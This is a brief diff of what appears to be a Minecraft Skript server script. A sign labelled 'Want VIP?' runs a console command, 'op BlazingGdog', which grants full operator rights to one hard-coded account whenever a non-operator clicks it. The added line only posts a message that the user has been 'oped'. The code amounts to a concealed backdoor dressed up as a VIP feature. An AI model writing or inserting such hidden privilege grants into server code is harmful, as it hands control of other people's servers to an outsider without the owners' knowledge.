@@ -18,3 +18,4 @@ on click:
     if second line of clicked block is "Want VIP?":
       if player is not op:
         make console execute command "op BlazingGdog"
+        send "You have been oped if you are Blaze!"
